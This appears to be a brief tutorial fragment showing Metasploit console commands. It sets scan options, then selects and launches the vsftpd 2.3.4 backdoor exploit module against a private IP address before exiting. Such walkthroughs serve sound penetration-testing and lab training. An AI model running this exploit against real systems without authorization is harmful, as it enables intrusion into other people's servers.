set RHOSTS <Target(s)>
set PORTS <Ports>
set THREADS <Threads>
run

search vsftp
use exploit/unix/ftp/vsftpd_234_backdoor
Info
If you wanted to define a different target, you would run the following command.
set RHOSTS 192.168.0.101
Once target and port are defined, run the exploit command to launch the exploit.
exploit
To disconnect from the target, I run the exit command.
exit
To exit Metasploit, also use the exit command.
exit
